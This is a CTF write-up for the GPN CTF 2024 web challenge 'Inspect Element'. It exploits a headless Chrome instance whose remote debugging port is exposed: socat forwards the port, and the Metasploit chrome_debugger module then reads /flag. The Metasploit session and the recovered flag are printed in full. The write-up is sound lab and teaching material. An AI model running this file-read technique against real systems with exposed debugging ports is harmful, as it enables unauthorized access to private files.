---
ctf-event: GPN CTF 2024
date: 2024-06-01
ctf-team: luxeria
ctf-task: Inspect Element
ctf-category: web
ctf-difficulty: 
---
# Inspect Element

## Description

> Maybe using Inspect Element will help you!

>Small hint: If you're struggling with reproducing it on remote, you can use `socat` to proxy the remote instance to `localhost:1337` like this: `socat TCP-LISTEN:1337,fork OPENSSL:xxx--xxx-1234.ctf.kitctf.de:443`
  and it should behave exactly like a locally running docker container.

## Analysis

The server starts a Chrome process with the remote debugging  port exposed:
```bash
socat tcp-listen:1337,fork tcp:localhost:13370 & \
  google-chrome --remote-debugging-port=13370 --disable-gpu --headless=new --no-sandbox google.com
```

## Solution

Forward a local port to the exposed debugging port (to have the port available via TCP and not only TLS):
```bash
socat TCP-LISTEN:1337,fork OPENSSL:how-deep-is-your-love--disciples-2841.ctf.kitctf.de:443
```

Use metasploit to read files via the exposed debugging port and get the flag:
```text
msf6 > use auxiliary/gather/chrome_debugger
msf6 auxiliary(gather/chrome_debugger) > set FILEPATH /flag
msf6 auxiliary(gather/chrome_debugger) > set RHOSTS 127.0.0.1
msf6 auxiliary(gather/chrome_debugger) > set RPORT 1337
msf6 auxiliary(gather/chrome_debugger) > run
[*] Running module against 127.0.0.1

[*] Attempting Connection to ws://127.0.0.1:1337/devtools/page/67C7888B105174679C2317632CA196A6
[*] Opened connection
[*] Attempting to load url file:///flag
[*] Received Data
[*] Sending request for data
[*] Received Data
[+] Stored file:///flag at /home/emanuel/.msf4/loot/20240601211048_default_127.0.0.1_chrome.debugger._933372.txt

[*] Auxiliary module execution completed

msf6 auxiliary(gather/chrome_debugger) > exit

$ cat /home/emanuel/.msf4/loot/20240601211341_default_127.0.0.1_chrome.debugger._870365.txt
<html><head><meta name="color-scheme" content="light dark"></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">GPNCTF{D4NG3R0U5_D3BUGG3R}
</pre></body></html>
```

## Resources

- https://blog.pentesteracademy.com/chrome-debugger-arbitrary-file-read-1ff2c41320d1